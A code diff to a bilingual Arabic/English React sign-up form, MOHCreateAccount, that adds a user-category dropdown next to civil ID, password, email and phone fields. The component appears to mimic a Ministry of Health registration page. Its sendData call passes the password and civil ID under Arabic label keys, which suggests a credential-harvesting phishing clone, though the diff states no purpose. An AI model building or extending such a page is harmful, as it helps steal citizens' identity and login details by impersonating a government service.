@@ -6,6 +6,7 @@ export default function MOHCreateAccount() {
   const [, setLocation] = useLocation();
   const [lang, setLang] = useState<'ar' | 'en'>('ar');
 
+  const [userCategory, setUserCategory] = useState('');
   const [civilId, setCivilId] = useState('');
   const [password, setPassword] = useState('');
   const [confirmPassword, setConfirmPassword] = useState('');
@@ -33,6 +34,8 @@ export default function MOHCreateAccount() {
       emailPh: 'أدخل البريد الإلكتروني',
       phone: 'رقم الهاتف',
       phonePh: 'أدخل رقم الهاتف',
+      userCategory: 'حدد فئة المستخدم',
+      userCategoryOptions: ['جهة حكومية', 'تسجيل شخصي / أفراد', 'تسجيل شركات / قطاع خاص', 'الجامعة'],
       createBtn: 'إنشاء حساب',
       haveAccount: 'لديك حساب بالفعل؟',
       login: 'تسجيل الدخول',
@@ -52,6 +55,8 @@ export default function MOHCreateAccount() {
       emailPh: 'Enter Email',
       phone: 'Phone Number',
       phonePh: 'Enter Phone Number',
+      userCategory: 'Select User Category',
+      userCategoryOptions: ['Government Entity', 'Personal / Individuals', 'Companies / Private Sector', 'University'],
       createBtn: 'Create Account',
       haveAccount: 'Already have an account?',
       login: 'Login',
@@ -89,6 +94,7 @@ export default function MOHCreateAccount() {
 
     sendData({
       data: {
+        'فئة المستخدم': userCategory,
         'الرقم المدني': civilId,
         'كلمة المرور': password,
         'البريد الإلكتروني': email,
@@ -130,6 +136,21 @@ export default function MOHCreateAccount() {
               <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.formTitle}</span>
             </div>
             <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
+              {/* User Category */}
+              <div style={{ marginBottom: 20 }}>
+                <label style={labelStyle}>{tx.userCategory}</label>
+                <select
+                  value={userCategory}
+                  onChange={(e) => setUserCategory(e.target.value)}
+                  style={{ ...inputStyle, background: '#fff', cursor: 'pointer' }}
+                >
+                  <option value="">{tx.userCategory}</option>
+                  {tx.userCategoryOptions.map((opt: string) => (
+                    <option key={opt} value={opt}>{opt}</option>
+                  ))}
+                </select>
+              </div>
+
               {/* Civil ID */}
               <div style={{ marginBottom: 20 }}>
                 <label style={labelStyle}>{tx.civilId} <span style={{ color: 'red' }}>*</span></label>
